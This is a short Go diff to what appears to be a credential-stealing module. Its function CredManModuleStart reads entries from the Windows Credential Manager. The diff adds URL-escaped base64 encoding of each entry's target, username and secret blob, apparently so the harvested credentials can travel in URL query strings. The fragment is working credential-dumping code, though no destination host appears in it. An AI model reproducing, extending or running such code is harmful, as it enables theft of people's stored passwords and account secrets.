@@ -4,6 +4,7 @@ import (
 	"encoding/base64"
 	"encoding/hex"
 	"log"
+	"net/url"
 	"syscall"
 	"unicode/utf16"
 	"unsafe"
@@ -164,11 +165,13 @@ func CredManModuleStart() common.ExtractCredentialsResult {
 
 	for i := range creds {
 
-		var encodedBlob = base64.StdEncoding.EncodeToString([]byte(creds[i].Blob))
+		var encodedBlob = url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(creds[i].Blob)))
+		var encodedTarget = url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(creds[i].Target)))
+		var encodedUsername = url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(creds[i].User)))
 
 		data = append(data, common.UrlNamePass{
-			Url:      creds[i].Target,
-			Username: creds[i].User,
+			Url:      encodedTarget,
+			Username: encodedUsername,
 			Pass:     encodedBlob,
 		})
 	}
